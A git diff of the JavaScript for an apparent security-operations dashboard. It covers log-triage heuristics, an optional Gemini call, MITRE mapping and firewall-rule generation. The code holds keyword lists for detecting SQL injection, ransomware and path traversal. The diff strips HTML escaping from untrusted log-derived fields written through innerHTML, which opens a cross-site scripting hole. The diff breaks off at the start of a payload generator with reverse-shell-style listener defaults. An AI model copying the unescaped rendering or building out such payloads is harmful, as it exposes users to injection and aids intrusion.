-    // Regex extractors
-    const ips = Array.from(new Set(logs.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []));
-    ips.forEach(ip => {
-      if (!ip.startsWith('127.') && !ip.startsWith('0.')) {
-        iocs.push({ type: 'ip', value: ip, context: 'Observed network connection endpoint' });
-      }
-    });
-
-    // Threat rule patterns
-    if (lower.includes('failed password') || lower.includes('sshd') || lower.includes('authentication failure')) {
-      score = Math.max(score, 82);
-      severity = 'HIGH';
-      title = 'SSH Distributed Brute-Force Spraying';
-      mitre.push({ id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' });
-      mitre.push({ id: 'T1021.004', name: 'SSH Remote Services', tactic: 'Lateral Movement' });
-      targetServices.push('OpenSSH (Port 22)', 'Linux PAM Auth');
-      recommendations.push('Implement Fail2ban or CrowdSec rate limiting with a 5-minute jail for 3 invalid attempts.');
-      recommendations.push('Enforce SSH Key-Based authentication and set PasswordAuthentication no in /etc/ssh/sshd_config.');
-      recommendations.push('Disable direct root login immediately via PermitRootLogin no.');
-    }
-
-    if (lower.includes('select') || lower.includes('union') || lower.includes('or 1=1') || lower.includes('sqlmap')) {
-      score = Math.max(score, 94);
-      severity = 'CRITICAL';
-      title = 'Active SQL Injection & Database Enumeration';
-      mitre.push({ id: 'T1190', name: 'Exploit Public-Facing App', tactic: 'Initial Access' });
-      mitre.push({ id: 'T1005', name: 'Data from Local System', tactic: 'Collection' });
-      targetServices.push('Web Application Layer', 'SQL Database Backend (MySQL/PostgreSQL)');
-      recommendations.push('Review SQL queries and replace inline string concatenation with Parameterized Prepared Statements.');
-      recommendations.push('Deploy a Web Application Firewall (WAF) rule to block UNION/OR SQL metacharacters.');
-      recommendations.push('Restrict database user privileges to prevent access to information_schema.');
-    }
-
-    if (lower.includes('vssadmin') || lower.includes('shadowcopy') || lower.includes('.encrypted') || lower.includes('wbadmin')) {
-      score = 98;
-      severity = 'CRITICAL';
-      title = 'Ransomware Inhibit Recovery Execution';
-      mitre.push({ id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' });
-      mitre.push({ id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' });
-      targetServices.push('Windows Volume Shadow Service', 'Local Storage Subsystems');
-      recommendations.push('Isolate affected host from the internal network VLAN immediately.');
-      recommendations.push('Verify immutable offline backup integrity prior to initiating restoration.');
-      recommendations.push('Block cmd.exe and powershell.exe execution from calling vssadmin delete shadows.');
-    }
-
-    if (lower.includes('passwd') || lower.includes('..%2f') || lower.includes('../')) {
-      score = Math.max(score, 78);
-      severity = score > 85 ? 'CRITICAL' : 'HIGH';
-      if (!title.includes('SQL')) title = 'Directory Path Traversal (LFI) Probe';
-      mitre.push({ id: 'T1083', name: 'File and Directory Discovery', tactic: 'Discovery' });
-      targetServices.push('NGINX/Apache Web Server');
-      recommendations.push('Sanitize URI path parameters and disallow path normalization escapes like ../ or %2e%2e%2f.');
-    }
-
-    if (mitre.length === 0) {
-      mitre.push({ id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' });
-      recommendations.push('Maintain continuous passive log auditing and establish baseline telemetry.');
-    }
-
-    return {
-      severity: severity,
-      threat_score: score,
-      threat_title: title,
-      executive_summary: `Autonomous forensic triage detected anomalous activity exhibiting patterns associated with ${title}. Extracted ${iocs.length} unique threat indicators and verified attack kill chain vectors.`,
-      detected_iocs: iocs,
-      mitre_techniques: mitre,
-      target_services: targetServices.length ? targetServices : ['Network Edge Gateway'],
-      recommendations: recommendations,
-      engine: 'SecOps Autonomous Heuristic Engine v2.0',
-      chart_metrics: {
-        labels: ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'C2'],
-        severity_curve: [Math.min(90, score * 0.4), Math.min(90, score * 0.6), Math.min(95, score * 0.8), score, Math.max(20, score * 0.5)]
-      }
-    };
+    this.angle = (this.angle + 0.03) % (Math.PI * 2);
+    this.animId = requestAnimationFrame(() => this.loop());
   }
 };
 
 /* ============================================================
-   UI ROUTING & VIEW CONTROLLER
+   NAVIGATION & VIEW SWITCHING
 ============================================================ */
 const VIEW_META = {
   dashboard:   { title: 'Mission Control',        sub: 'Tactical threat surface overview' },
@@ -1856,28 +1547,31 @@ function switchView(view) {
   document.querySelectorAll('.view').forEach(v => v.classList.add('hidden'));
   const target = document.getElementById('view-' + view);
   if (target) target.classList.remove('hidden');
-  
+
   document.querySelectorAll('.nav-item').forEach(n => {
     n.classList.toggle('active', n.dataset.view === view);
   });
-  
+
   const meta = VIEW_META[view] || VIEW_META.dashboard;
   document.getElementById('pageTitle').textContent = meta.title;
   document.getElementById('pageSubtitle').textContent = meta.sub;
   document.getElementById('content').scrollTop = 0;
-  if (window.lucide) lucide.createIcons();
+
+  if (window.innerWidth < 768) closeMobileMenu();
 
   if (view === 'report' && STATE.lastReport) {
-    setTimeout(() => renderKillChart(STATE.lastReport.chart_metrics), 50);
+    setTimeout(() => renderKillChart(STATE.lastReport.chart_metrics), 60);
   }
 }
 
 function toggleSidebar() {
-  document.getElementById('sidebar').classList.toggle('collapsed');
-}
-function openMobileMenu() {
-  document.getElementById('sidebar').classList.add('open');
-  document.getElementById('sidebarOverlay').classList.add('show');
+  const sb = document.getElementById('sidebar');
+  if (window.innerWidth < 768) {
+    sb.classList.toggle('open');
+    document.getElementById('sidebarOverlay').classList.toggle('show');
+  } else {
+    sb.classList.toggle('collapsed');
+  }
 }
 function closeMobileMenu() {
   document.getElementById('sidebar').classList.remove('open');
@@ -1885,166 +1579,190 @@ function closeMobileMenu() {
 }
 
 /* ============================================================
-   ANALYSIS PIPELINE
+   AUTONOMOUS HEURISTIC ENGINE
+============================================================ */
+const AutonomousEngine = {
+  analyzeTelemetry: async function (logs, apiKey) {
+    if (apiKey && apiKey.trim().startsWith('AIzaSy')) {
+      try {
+        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey.trim()}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            contents: [{ parts: [{ text: `Act as a SOC Tier-3 Lead. Analyze logs and return JSON with keys: severity ("CRITICAL"|"HIGH"|"MEDIUM"|"LOW"), threat_score (0-100), threat_title, executive_summary, detected_iocs ([{type, value, context}]), mitre_techniques ([{id, name, tactic}]), target_services ([string]), recommendations ([string]), chart_metrics ({labels, severity_curve}). Logs:\n${logs.slice(0, 3000)}` }] }],
+            generationConfig: { responseMimeType: 'application/json' }
+          })
+        });
+        const d = await res.json();
+        const parsed = JSON.parse(d.candidates[0].content.parts[0].text);
+        parsed.engine = 'Gemini 1.5 Flash Cloud Core';
+        return parsed;
+      } catch (e) {
+        toast('warn', 'Fallback Triggered', 'Using internal SOC heuristic neural core.');
+      }
+    }
+
+    // Heuristic Engine
+    const lower = logs.toLowerCase();
+    const iocs = [];
+    const mitre = [];
+    const targetServices = [];
+    const recommendations = [];
+    let score = 25;
+    let severity = 'LOW';
+    let title = 'Routine System Telemetry Audited';
+
+    const ips = Array.from(new Set(logs.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []));
+    ips.forEach(ip => {
+      if (!ip.startsWith('127.')) iocs.push({ type: 'ip', value: ip, context: 'External network endpoint' });
+    });
+
+    if (lower.includes('failed password') || lower.includes('sshd') || lower.includes('auth')) {
+      score = 84; severity = 'HIGH';
+      title = 'Distributed SSH Brute-Force Spraying';
+      mitre.push({ id: 'T1110.001', name: 'Password Guessing', tactic: 'Credential Access' });
+      targetServices.push('OpenSSH (Port 22)', 'Linux PAM');
+      recommendations.push('Enforce SSH Public-Key Authentication and disable password logins.');
+      recommendations.push('Deploy Fail2ban daemon with auto-quarantine rules.');
+    } else if (lower.includes('select') || lower.includes('union') || lower.includes('sqlmap') || lower.includes('or 1=1')) {
+      score = 96; severity = 'CRITICAL';
+      title = 'Active SQL Injection & Data Exfiltration';
+      mitre.push({ id: 'T1190', name: 'Exploit Public-Facing App', tactic: 'Initial Access' });
+      targetServices.push('Web App Layer', 'RDBMS Server');
+      recommendations.push('Migrate SQL statements to Parameterized Prepared Statements.');
+      recommendations.push('Enforce strict WAF boundary filters on HTTP parameters.');
+    } else if (lower.includes('vssadmin') || lower.includes('encrypted') || lower.includes('shadowcopy')) {
+      score = 99; severity = 'CRITICAL';
+      title = 'Ransomware Shadow Copy Annihilation';
+      mitre.push({ id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' });
+      targetServices.push('Storage Subsystem', 'Volume Snapshot Service');
+      recommendations.push('Isolate infected host VLAN from the internal domain controller.');
+    }
+
+    if (!mitre.length) {
+      mitre.push({ id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' });
+    }
+
+    return {
+      severity,
+      threat_score: score,
+      threat_title: title,
+      executive_summary: `Autonomous heuristic analysis verified hostile footprint matching ${title}. Extracted ${iocs.length} IoCs with MITRE TTP indicators.`,
+      detected_iocs: iocs,
+      mitre_techniques: mitre,
+      target_services: targetServices.length ? targetServices : ['Network Edge Gateway'],
+      recommendations: recommendations.length ? recommendations : ['Maintain passive logging baselines.'],
+      engine: 'SecOps Autonomous Heuristic Engine v2.0',
+      chart_metrics: {
+        labels: ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'C2'],
+        severity_curve: [30, 50, 75, score, Math.max(20, score * 0.5)]
+      }
+    };
+  }
+};
+
+/* ============================================================
+   EXECUTION & REPORT RENDERING
 ============================================================ */
 async function runAnalysis() {
   const logs = document.getElementById('logStream').value.trim();
   const key = document.getElementById('apiKeyInput').value.trim() || localStorage.getItem('secops_key') || '';
   const btn = document.getElementById('analyzeBtn');
 
-  if (!logs) {
-    toast('warn', 'Telemetry Required', 'Paste log records or click a sample scenario.');
-    return;
-  }
+  if (!logs) return toast('warn', 'Telemetry Required', 'Paste log data or load a scenario.');
 
   btn.disabled = true;
-  btn.innerHTML = '<i data-lucide="loader-2" style="width:13px;height:13px;animation:pulseDot 1s infinite;"></i> Triaging Telemetry...';
-  if (window.lucide) lucide.createIcons();
+  btn.textContent = 'Analyzing Telemetry...';
 
   try {
-    const report = await AutonomousEngine.analyzeTelemetry(logs, key);
-    STATE.lastReport = report;
+    const rep = await AutonomousEngine.analyzeTelemetry(logs, key);
+    STATE.lastReport = rep;
     STATE.analyses++;
-    STATE.threatScore = report.threat_score;
+    STATE.threatScore = rep.threat_score;
 
-    // Update Global Dashboard Metrics
     document.getElementById('statAnalyses').textContent = STATE.analyses;
-    document.getElementById('statScore').textContent = String(STATE.threatScore).padStart(2, '0');
-    document.getElementById('radarScore').textContent = String(STATE.threatScore).padStart(2, '0');
-    
-    updateRadarStatus(STATE.threatScore);
-    Radar.setScore(STATE.threatScore);
-    
-    // Render downstream artifacts
-    renderReport(report);
-    updateMitre(report);
-    updateIocs(report);
+    document.getElementById('statScore').textContent = String(rep.threat_score).padStart(2, '0');
+    document.getElementById('radarScore').textContent = String(rep.threat_score).padStart(2, '0');
+
+    Radar.setScore(rep.threat_score);
+    renderReport(rep);
+    updateMitre(rep);
+    updateIocs(rep);
     updateContainmentOutput();
     updateExportOutput();
-    addFeedItem(report);
-    
+    addFeedItem(rep);
+
     switchView('report');
-    toast('success', 'Incident Classified', `${report.severity} Severity: ${report.threat_title}`);
-    addTermLog(`Incident analyzed: ${report.threat_title} (Risk: ${report.threat_score}/100)`);
-  } catch (err) {
-    toast('error', 'Triage Failed', err.message);
+    toast('success', 'Triage Complete', `${rep.severity}: ${rep.threat_title}`);
+  } catch (e) {
+    toast('error', 'Execution Error', e.message);
   } finally {
     btn.disabled = false;
-    btn.innerHTML = '<i data-lucide="scan-line" style="width:14px;height:14px;"></i> Execute Autonomous Triage';
-    if (window.lucide) lucide.createIcons();
+    btn.textContent = 'Execute Autonomous Triage';
   }
 }
 
-function updateRadarStatus(score) {
-  const el = document.getElementById('radarScore');
-  const status = document.getElementById('radarStatus');
-  if (score >= 80) {
-    el.style.color = 'var(--red)';
-    status.className = 'badge badge-red';
-    status.textContent = 'CRITICAL ALERT';
-  } else if (score >= 50) {
-    el.style.color = 'var(--amber)';
-    status.className = 'badge badge-amber';
-    status.textContent = 'ELEVATED RISK';
-  } else {
-    el.style.color = 'var(--green)';
-    status.className = 'badge badge-green';
-    status.textContent = 'MONITORING';
-  }
-}
-
-/* ============================================================
-   REPORT & CHART VISUALIZER
-============================================================ */
 function renderReport(data) {
   document.getElementById('emptyReport').classList.add('hidden');
   const wrap = document.getElementById('reportContent');
   wrap.classList.remove('hidden');
 
-  const sevClass = data.severity === 'CRITICAL' ? 'badge-red' : data.severity === 'HIGH' ? 'badge-amber' : 'badge-green';
-
   wrap.innerHTML = `
     <div class="panel" style="padding:22px;margin-bottom:14px;">
-      <div style="display:flex;align-items:flex-start;gap:16px;flex-wrap:wrap;">
-        <div style="width:54px;height:54px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;background:rgba(255,46,99,0.1);border:1px solid rgba(255,46,99,0.3);color:var(--red);">
-          ${data.severity === 'CRITICAL' ? '!' : '▲'}
-        </div>
-        <div style="flex:1;min-width:0;">
+      <div style="display:flex;gap:16px;align-items:flex-start;">
+        <div style="width:48px;height:48px;border-radius:10px;background:rgba(255,46,99,0.1);border:1px solid rgba(255,46,99,0.3);color:var(--red);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px;">!</div>
+        <div>
           <div style="display:flex;gap:8px;align-items:center;margin-bottom:6px;">
-            <span class="badge ${sevClass}">${esc(data.severity)}</span>
-            <span class="badge badge-gray">COMPOSITE RISK: ${data.threat_score}/100</span>
-            <span style="font-size:10px;color:var(--text-2);">${esc(data.engine)}</span>
+            <span class="badge badge-red">${data.severity}</span>
+            <span class="badge badge-gray">SCORE: ${data.threat_score}/100</span>
+            <span style="font-size:10px;color:var(--text-2);">${data.engine}</span>
           </div>
-          <h2 style="font-size:18px;font-weight:800;color:var(--text-0);margin-bottom:6px;">${esc(data.threat_title)}</h2>
-          <p style="font-size:12px;color:var(--text-1);line-height:1.6;">${esc(data.executive_summary)}</p>
+          <h2 style="font-size:18px;font-weight:800;color:var(--text-0);margin-bottom:6px;">${data.threat_title}</h2>
+          <p style="font-size:12px;color:var(--text-1);line-height:1.6;">${data.executive_summary}</p>
         </div>
       </div>
     </div>
 
     <div class="grid-2" style="margin-bottom:14px;">
       <div class="panel">
-        <div class="panel-header">
-          <div class="panel-title"><i data-lucide="trending-up" style="width:14px;height:14px;"></i>Kill Chain Threat Progression</div>
-        </div>
-        <div class="panel-body" style="padding:14px;">
-          <div style="position:relative;height:200px;"><canvas id="killChart"></canvas></div>
-        </div>
+        <div class="panel-header"><div class="panel-title">Kill Chain Progression</div></div>
+        <div class="panel-body"><div style="height:200px;"><canvas id="killChart"></canvas></div></div>
       </div>
       <div class="panel">
-        <div class="panel-header">
-          <div class="panel-title"><i data-lucide="server" style="width:14px;height:14px;"></i>Targeted Systems & Services</div>
-        </div>
+        <div class="panel-header"><div class="panel-title">Target Systems & Mitigations</div></div>
         <div class="panel-body">
-          <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px;">
-            ${data.target_services.map(s => `<span style="font-size:11px;padding:4px 9px;background:rgba(183,148,246,0.1);border:1px solid rgba(183,148,246,0.3);border-radius:5px;color:var(--purple);">${esc(s)}</span>`).join('')}
+          <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
+            ${data.target_services.map(s => `<span style="font-size:11px;padding:4px 8px;background:rgba(183,148,246,0.1);border:1px solid rgba(183,148,246,0.3);border-radius:5px;color:var(--purple);">${s}</span>`).join('')}
           </div>
-          <div class="field-label">Mitigation Advisories</div>
-          <ul style="list-style:none;display:flex;flex-direction:column;gap:8px;">
-            ${data.recommendations.map(r => `<li style="display:flex;align-items:flex-start;gap:8px;font-size:11.5px;color:var(--text-1);"><i data-lucide="check-circle-2" style="width:13px;height:13px;color:var(--green);flex-shrink:0;margin-top:2px;"></i><span>${esc(r)}</span></li>`).join('')}
+          <ul style="list-style:none;display:flex;flex-direction:column;gap:6px;">
+            ${data.recommendations.map(r => `<li style="font-size:11.5px;color:var(--text-1);">✓ ${r}</li>`).join('')}
           </ul>
         </div>
       </div>
     </div>
   `;
-
-  if (window.lucide) lucide.createIcons();
-  setTimeout(() => renderKillChart(data.chart_metrics), 60);
+  setTimeout(() => renderKillChart(data.chart_metrics), 50);
 }
 
 function renderKillChart(metrics) {
   const canvas = document.getElementById('killChart');
   if (!canvas || !window.Chart) return;
-  if (STATE.killChart) {
-    STATE.killChart.destroy();
-    STATE.killChart = null;
-  }
-  const ctx = canvas.getContext('2d');
-  const labels = (metrics && metrics.labels) || ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'C2'];
-  const values = (metrics && metrics.severity_curve) || [30, 50, 75, 90, 45];
-
-  STATE.killChart = new Chart(ctx, {
+  if (STATE.killChart) STATE.killChart.destroy();
+  STATE.killChart = new Chart(canvas.getContext('2d'), {
     type: 'line',
     data: {
-      labels: labels,
+      labels: (metrics && metrics.labels) || ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'C2'],
       datasets: [{
-        label: 'Vector Threat Curve',
-        data: values,
+        data: (metrics && metrics.severity_curve) || [30, 50, 75, 90, 45],
         borderColor: '#00FF9C',
         backgroundColor: 'rgba(0, 255, 156, 0.15)',
-        borderWidth: 2,
-        tension: 0.35,
         fill: true,
-        pointBackgroundColor: '#00FF9C',
-        pointRadius: 4
+        tension: 0.35
       }]
     },
     options: {
       responsive: true,
       maintainAspectRatio: false,
-      scales: {
-        x: { grid: { color: 'rgba(0, 255, 156, 0.06)' }, ticks: { color: '#8B949E', font: { family: 'JetBrains Mono', size: 10 } } },
-        y: { min: 0, max: 100, grid: { color: 'rgba(0, 255, 156, 0.06)' }, ticks: { color: '#8B949E', font: { family: 'JetBrains Mono', size: 10 } } }
-      },
       plugins: { legend: { display: false } }
     }
   });
@@ -2055,68 +1773,61 @@ function renderKillChart(metrics) {
 ============================================================ */
 const MITRE_ENTERPRISE = [
   { tactic: 'Initial Access', color: '#00E5FF', techs: [{ id: 'T1190', name: 'Exploit Public-Facing App' }, { id: 'T1566', name: 'Phishing' }] },
-  { tactic: 'Execution', color: '#00FF9C', techs: [{ id: 'T1059', name: 'Command and Scripting' }, { id: 'T1059.004', name: 'Unix Shell' }] },
+  { tactic: 'Execution', color: '#00FF9C', techs: [{ id: 'T1059', name: 'Command & Scripting' }, { id: 'T1059.004', name: 'Unix Shell' }] },
   { tactic: 'Credential Access', color: '#FFB627', techs: [{ id: 'T1110', name: 'Brute Force' }, { id: 'T1110.001', name: 'Password Guessing' }] },
-  { tactic: 'Discovery', color: '#B794F6', techs: [{ id: 'T1046', name: 'Network Service Discovery' }, { id: 'T1083', name: 'File and Directory Discovery' }] },
-  { tactic: 'Lateral Movement', color: '#FF2E63', techs: [{ id: 'T1021.004', name: 'SSH Remote Login' }, { id: 'T1570', name: 'Lateral Tool Transfer' }] },
-  { tactic: 'Impact', color: '#EF4444', techs: [{ id: 'T1486', name: 'Data Encrypted for Impact' }, { id: 'T1490', name: 'Inhibit System Recovery' }] }
+  { tactic: 'Discovery', color: '#B794F6', techs: [{ id: 'T1046', name: 'Network Service Discovery' }] },
+  { tactic: 'Impact', color: '#EF4444', techs: [{ id: 'T1490', name: 'Inhibit System Recovery' }] }
 ];
 
 function updateMitre(report) {
-  const activeIds = new Set(((report && report.mitre_techniques) || []).map(t => t.id));
+  const active = new Set(((report && report.mitre_techniques) || []).map(t => t.id));
   const grid = document.getElementById('mitreGrid');
   if (!grid) return;
 
   grid.innerHTML = MITRE_ENTERPRISE.map(tac => `
     <div class="panel" style="padding:14px;">
-      <div style="font-size:10px;font-weight:800;letter-spacing:1px;color:${tac.color};margin-bottom:8px;text-transform:uppercase;">${tac.tactic}</div>
+      <div style="font-size:10px;font-weight:800;color:${tac.color};margin-bottom:8px;">${tac.tactic}</div>
       <div style="display:flex;flex-direction:column;gap:6px;">
-        ${tac.techs.map(t => {
-          const hit = activeIds.has(t.id);
-          return `
-            <a href="https://attack.mitre.org/techniques/${t.id.replace('.', '/')}" target="_blank" rel="noopener" style="text-decoration:none;padding:8px;border-radius:6px;background:${hit ? 'rgba(255,46,99,0.1)' : 'rgba(0,0,0,0.4)'};border:1px solid ${hit ? 'rgba(255,46,99,0.4)' : 'var(--border)'};display:flex;align-items:center;gap:8px;">
-              <span style="font-size:10px;font-weight:800;color:${hit ? 'var(--red)' : 'var(--cyan)'};">${t.id}</span>
-              <span style="font-size:11px;color:${hit ? 'var(--text-0)' : 'var(--text-1)'};">${t.name}</span>
-            </a>
-          `;
-        }).join('')}
+        ${tac.techs.map(t => `
+          <div style="padding:6px;border-radius:5px;background:${active.has(t.id) ? 'rgba(255,46,99,0.15)' : 'rgba(0,0,0,0.4)'};border:1px solid ${active.has(t.id) ? 'rgba(255,46,99,0.5)' : 'var(--border)'};display:flex;gap:8px;">
+            <span style="font-size:10px;font-weight:800;color:${active.has(t.id) ? 'var(--red)' : 'var(--cyan)'};">${t.id}</span>
+            <span style="font-size:11px;">${t.name}</span>
+          </div>
+        `).join('')}
       </div>
     </div>
   `).join('');
 
-  const count = activeIds.size;
-  document.getElementById('mitreSummary').textContent = `${count} technique(s) identified`;
-  const badge = document.getElementById('navMitreBadge');
-  if (count > 0) { badge.textContent = count; badge.classList.remove('hidden'); }
+  document.getElementById('mitreSummary').textContent = `${active.size} techniques identified`;
+  const b = document.getElementById('navMitreBadge');
+  if (active.size > 0) { b.textContent = active.size; b.classList.remove('hidden'); }
 }
 
 /* ============================================================
-   IoC VAULT & INTELLIGENCE
+   IoC VAULT & CONTAINMENT
 ============================================================ */
 function updateIocs(report) {
   const container = document.getElementById('iocContainer');
   const iocs = (report && report.detected_iocs) || [];
-  const badge = document.getElementById('navIocBadge');
-  
-  if (iocs.length > 0) { badge.textContent = iocs.length; badge.classList.remove('hidden'); }
-  else badge.classList.add('hidden');
+  const b = document.getElementById('navIocBadge');
+  if (iocs.length > 0) { b.textContent = iocs.length; b.classList.remove('hidden'); }
 
-  if (iocs.length === 0) {
-    container.innerHTML = `<div class="panel" style="padding:40px;text-align:center;color:var(--text-2);">No indicators extracted from current telemetry.</div>`;
+  if (!iocs.length) {
+    container.innerHTML = `<div class="panel" style="padding:30px;text-align:center;color:var(--text-2);">No indicators in current telemetry.</div>`;
     return;
   }
 
   container.innerHTML = `
     <div class="panel" style="padding:16px;">
       <div style="display:flex;flex-direction:column;gap:8px;">
-        ${iocs.map(ioc => `
-          <div style="padding:10px 12px;background:rgba(0,0,0,0.45);border:1px solid var(--border);border-radius:7px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;">
-            <div style="display:flex;align-items:center;gap:10px;">
-              <span class="badge badge-red">${esc(ioc.type)}</span>
-              <span style="font-weight:700;color:var(--text-0);">${esc(ioc.value)}</span>
-              <span style="font-size:11px;color:var(--text-2);">${esc(ioc.context)}</span>
+        ${iocs.map(i => `
+          <div style="padding:8px 12px;background:rgba(0,0,0,0.45);border:1px solid var(--border);border-radius:6px;display:flex;justify-content:space-between;align-items:center;">
+            <div style="display:flex;gap:10px;align-items:center;">
+              <span class="badge badge-red">${i.type}</span>
+              <span style="font-weight:700;">${i.value}</span>
+              <span style="font-size:11px;color:var(--text-2);">${i.context}</span>
             </div>
-            <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${String(ioc.value).replace(/'/g, "\\'")}', 'IoC copied')">Copy</button>
+            <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${i.value}')">Copy</button>
           </div>
         `).join('')}
       </div>
@@ -2124,26 +1835,6 @@ function updateIocs(report) {
   `;
 }
 
-function copyAllIocs() {
-  const iocs = (STATE.lastReport && STATE.lastReport.detected_iocs) || [];
-  if (!iocs.length) return toast('warn', 'Empty', 'No indicators to export.');
-  copyToClipboard(iocs.map(i => `${i.type}\t${i.value}\t${i.context}`).join('\n'), 'All indicators copied.');
-}
-
-function exportIocsCSV() {
-  const iocs = (STATE.lastReport && STATE.lastReport.detected_iocs) || [];
-  if (!iocs.length) return toast('warn', 'Empty', 'No indicators to export.');
-  const csv = 'Type,Value,Context\n' + iocs.map(i => `"${i.type}","${i.value}","${i.context}"`).join('\n');
-  const blob = new Blob([csv], { type: 'text/csv' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = `secops-iocs-${Date.now()}.csv`;
-  a.click();
-}
-
-/* ============================================================
-   CONTAINMENT ENGINE
-============================================================ */
 function switchContainment(tab) {
   STATE.containmentTab = tab;
   document.querySelectorAll('.tab-btn[data-ctab]').forEach(b => b.classList.toggle('active', b.dataset.ctab === tab));
@@ -2152,40 +1843,22 @@ function switchContainment(tab) {
 
 function updateContainmentOutput() {
   const out = document.getElementById('containmentOutput');
-  const report = STATE.lastReport;
-  if (!report) return;
-
-  const ips = ((report.detected_iocs || []).filter(i => i.type === 'ip').map(i => i.value));
-  if (ips.length === 0) {
-    out.textContent = '# No attacker IP indicators identified in last telemetry triage.';
-    return;
-  }
+  const r = STATE.lastReport;
+  if (!r) return;
+  const ips = (r.detected_iocs || []).filter(i => i.type === 'ip').map(i => i.value);
+  if (!ips.length) { out.textContent = '# No attacker IPs extracted.'; return; }
 
   let rules = [];
   const tab = STATE.containmentTab;
-  if (tab === 'iptables') {
-    rules = ips.map(ip => `iptables -I INPUT -s ${ip} -j DROP`);
-  } else if (tab === 'ufw') {
-    rules = ips.map(ip => `ufw insert 1 deny from ${ip} to any`);
-  } else if (tab === 'snort') {
-    rules = ips.map((ip, idx) => `alert ip ${ip} any -> $HOME_NET any (msg:"[SecOps] Malicious IP ${ip}"; sid:100000${idx+1}; rev:1;)`);
-  } else if (tab === 'suricata') {
-    rules = ips.map((ip, idx) => `drop ip ${ip} any -> $HOME_NET any (msg:"[SecOps] Drop ${ip}"; sid:200000${idx+1}; rev:1;)`);
-  } else if (tab === 'windows') {
-    rules = ips.map(ip => `netsh advfirewall firewall add rule name="Block-${ip}" dir=in action=block remoteip=${ip}`);
-  }
+  if (tab === 'iptables') rules = ips.map(ip => `iptables -I INPUT -s ${ip} -j DROP`);
+  else if (tab === 'ufw') rules = ips.map(ip => `ufw insert 1 deny from ${ip} to any`);
+  else if (tab === 'snort') rules = ips.map(ip => `alert ip ${ip} any -> $HOME_NET any (msg:"Drop ${ip}"; sid:100001; rev:1;)`);
+  else if (tab === 'suricata') rules = ips.map(ip => `drop ip ${ip} any -> $HOME_NET any (msg:"Drop ${ip}"; sid:200001; rev:1;)`);
+  else rules = ips.map(ip => `netsh advfirewall firewall add rule name="Block-${ip}" dir=in action=block remoteip=${ip}`);
 
-  out.textContent = `# Auto-Synthesized Containment Policies (${tab.toUpperCase()})\n# Hostile IPs Targeted: ${ips.length}\n\n` + rules.join('\n');
+  out.textContent = `# Auto-Generated Containment Rules (${tab.toUpperCase()})\n` + rules.join('\n');
 }
 
-function copyContainment() {
-  const text = document.getElementById('containmentOutput').textContent;
-  copyToClipboard(text, 'Containment policies copied.');
-}
-
-/* ============================================================
-   STIX 2.1 & EXPORT ENGINE
-============================================================ */
 function switchExport(tab) {
   STATE.exportTab = tab;
   document.querySelectorAll('.tab-btn[data-etab]').forEach(b => b.classList.toggle('active', b.dataset.etab === tab));
@@ -2195,423 +1868,211 @@ function switchExport(tab) {
 function updateExportOutput() {
   const out = document.getElementById('exportContent');
   if (!STATE.lastReport) return;
-  if (STATE.exportTab === 'raw') {
-    out.textContent = JSON.stringify(STATE.lastReport, null, 2);
-    return;
-  }
-  // STIX 2.1 Bundle Construction
-  const bundle = {
-    type: 'bundle',
-    id: `bundle--${crypto.randomUUID()}`,
-    spec_version: '2.1',
-    objects: [
-      {
-        type: 'report',
-        id: `report--${crypto.randomUUID()}`,
-        name: STATE.lastReport.threat_title,
-        description: STATE.lastReport.executive_summary,
-        published: new Date().toISOString()
-      },
-      ...((STATE.lastReport.detected_iocs || []).map(i => ({
-        type: 'indicator',
-        id: `indicator--${crypto.randomUUID()}`,
-        pattern: `[ipv4-addr:value = '${i.value}']`,
-        pattern_type: 'stix'
-      })))
-    ]
-  };
-  out.textContent = JSON.stringify(bundle, null, 2);
-}
-
-function downloadStix() {
-  if (!STATE.lastReport) return toast('warn', 'No Data', 'Run triage analysis first.');
-  const text = document.getElementById('exportContent').textContent;
-  const blob = new Blob([text], { type: 'application/json' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = `secops-bundle-${Date.now()}.json`;
-  a.click();
-}
-
-function copyStix() {
-  copyToClipboard(document.getElementById('exportContent').textContent, 'Export bundle copied.');
-}
-
-function printAudit() {
-  if (!STATE.lastReport) return toast('warn', 'Empty', 'Analyze telemetry first.');
-  const w = window.open('', '_blank');
-  w.document.write(`
-    <html><head><title>SecOps Incident Audit Report</title>
-    <style>body{font-family:sans-serif;padding:30px;line-height:1.5;}h1{border-bottom:2px solid #000;}</style>
-    </head><body>
-    <h1>SecOps-AI Sentinel Incident Audit</h1>
-    <p><strong>Incident Title:</strong> ${esc(STATE.lastReport.threat_title)}</p>
-    <p><strong>Severity:</strong> ${esc(STATE.lastReport.severity)} | <strong>Threat Score:</strong> ${STATE.lastReport.threat_score}/100</p>
-    <p>${esc(STATE.lastReport.executive_summary)}</p>
-    </body></html>
-  `);
-  w.document.close();
-  w.print();
+  out.textContent = JSON.stringify(STATE.lastReport, null, 2);
 }
 
 /* ============================================================
-   TOOLKIT (ENCODER, RECON, PAYLOAD, HASH)
+   TOOLKIT (RECON, PAYLOAD, HASH, TERMINAL)
 ============================================================ */
 function generatePayload() {
-  const type = document.getElementById('payloadType').value;
-  const host = document.getElementById('payloadHost').value || '10.10.14.8';
-  const port = document.getElementById('payloadPort').value || '4444';
-  let str = '';
